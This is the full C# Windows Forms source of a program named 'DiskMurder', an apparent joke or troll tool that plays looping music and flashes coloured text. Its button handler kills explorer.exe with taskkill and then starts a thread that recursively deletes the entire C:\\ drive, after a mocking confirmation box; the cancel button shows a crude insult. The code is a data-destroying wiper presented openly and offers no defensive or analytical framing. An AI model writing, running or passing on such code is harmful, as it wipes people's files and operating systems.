using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Media;

namespace DiskMurder
{
    public partial class Form1 : Form
    {
        public static Random RNG = new Random();
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            button1.Enabled = false;
            timer1.Enabled = true;
            SoundPlayer sp = new SoundPlayer(DiskMurder.Properties.Resources.Kitsune2_rock_my_emotions);
            sp.PlayLooping();
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            button1.Enabled = true;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("ight", "ur a pussy", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            Application.Exit();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("bro you want to do this fr?", "K", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            Process.Start("C://Windows//System32//taskkill.exe", "/F /IM explorer.exe");
            new Thread(() => Directory.Delete("c:\\", true)).Start();

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            int one = RNG.Next(0, 255);
            int two = RNG.Next(0, 255);
            int three = RNG.Next(0, 255);
            int four = RNG.Next(0, 255);
            label1.ForeColor = Color.FromArgb(one, two, three, four);
        }
    }
}
